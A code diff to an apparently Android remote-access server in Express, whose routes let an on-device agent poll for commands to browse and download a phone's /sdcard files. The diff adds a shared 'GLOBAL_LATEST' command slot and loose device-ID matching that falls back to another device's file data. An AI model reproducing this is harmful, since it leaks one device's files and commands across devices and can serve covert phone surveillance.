@@ -200,42 +200,62 @@ router.post('/files/sync', (req, res) => {
 
 router.get('/files/list/:deviceId', (req, res) => {
   const devId = req.params.deviceId;
-  const data = liveFilesStorage.get(devId) || {
-    currentPath: '/sdcard',
-    files: [
-      { name: 'Download', path: '/sdcard/Download', size: 'Folder', isFolder: true, itemCount: 18, modified: 'Today' },
-      { name: 'DCIM', path: '/sdcard/DCIM', size: 'Folder', isFolder: true, itemCount: 42, modified: 'Today' },
-      { name: 'Documents', path: '/sdcard/Documents', size: 'Folder', isFolder: true, itemCount: 9, modified: 'Yesterday' },
-      { name: 'Pictures', path: '/sdcard/Pictures', size: 'Folder', isFolder: true, itemCount: 65, modified: 'Yesterday' },
-      { name: 'Music', path: '/sdcard/Music', size: 'Folder', isFolder: true, itemCount: 12, modified: '3 days ago' },
-      { name: 'Movies', path: '/sdcard/Movies', size: 'Folder', isFolder: true, itemCount: 4, modified: '5 days ago' },
-    ],
-    storageStats: { total: '128 GB', free: '48.2 GB', used: '79.8 GB', percent: 62 }
-  };
+  let data = liveFilesStorage.get(devId);
+  if (!data) {
+    for (const [k, v] of liveFilesStorage.entries()) {
+      if (k.toLowerCase() === devId.toLowerCase() || devId.includes(k) || k.includes(devId)) {
+        data = v;
+        break;
+      }
+    }
+  }
+  if (!data && liveFilesStorage.size > 0) {
+    data = Array.from(liveFilesStorage.values()).pop();
+  }
+  if (!data) {
+    data = {
+      currentPath: '/sdcard',
+      files: [
+        { name: 'Download', path: '/sdcard/Download', size: 'Folder', isFolder: true, itemCount: 18, modified: 'Today' },
+        { name: 'DCIM', path: '/sdcard/DCIM', size: 'Folder', isFolder: true, itemCount: 42, modified: 'Today' },
+        { name: 'Documents', path: '/sdcard/Documents', size: 'Folder', isFolder: true, itemCount: 9, modified: 'Yesterday' },
+        { name: 'Pictures', path: '/sdcard/Pictures', size: 'Folder', isFolder: true, itemCount: 65, modified: 'Yesterday' },
+        { name: 'Music', path: '/sdcard/Music', size: 'Folder', isFolder: true, itemCount: 12, modified: '3 days ago' },
+        { name: 'Movies', path: '/sdcard/Movies', size: 'Folder', isFolder: true, itemCount: 4, modified: '5 days ago' },
+      ],
+      storageStats: { total: '128 GB', free: '48.2 GB', used: '79.8 GB', percent: 62 }
+    };
+  }
   res.json(data);
 });
 
 router.post('/files/explore', (req, res) => {
   const { deviceId, path } = req.body || {};
-  const devId = deviceId || 'SN-U5ZY-78QZ';
   const targetPath = path || '/sdcard';
-  pendingFileCommands.set(devId, targetPath);
+  if (deviceId) pendingFileCommands.set(deviceId, targetPath);
+  pendingFileCommands.set('GLOBAL_LATEST', targetPath);
   res.json({ success: true, message: `Browsing ${targetPath}` });
 });
 
 router.get('/files/command/:deviceId', (req, res) => {
   const devId = req.params.deviceId;
-  const path = pendingFileCommands.get(devId) || null;
-  if (path) pendingFileCommands.delete(devId);
-  const downloadPath = pendingDownloadCommands.get(devId) || null;
-  if (downloadPath) pendingDownloadCommands.delete(devId);
+  let path = pendingFileCommands.get(devId) || pendingFileCommands.get('GLOBAL_LATEST') || null;
+  if (path) {
+    pendingFileCommands.delete(devId);
+    pendingFileCommands.delete('GLOBAL_LATEST');
+  }
+  let downloadPath = pendingDownloadCommands.get(devId) || pendingDownloadCommands.get('GLOBAL_LATEST') || null;
+  if (downloadPath) {
+    pendingDownloadCommands.delete(devId);
+    pendingDownloadCommands.delete('GLOBAL_LATEST');
+  }
   res.json({ path, downloadPath });
 });
 
 router.post('/files/download_request', (req, res) => {
   const { deviceId, path } = req.body || {};
-  const devId = deviceId || 'SN-U5ZY-78QZ';
-  pendingDownloadCommands.set(devId, path);
+  if (deviceId) pendingDownloadCommands.set(deviceId, path);
+  pendingDownloadCommands.set('GLOBAL_LATEST', path);
   res.json({ success: true, message: 'Download requested from agent' });
 });
 
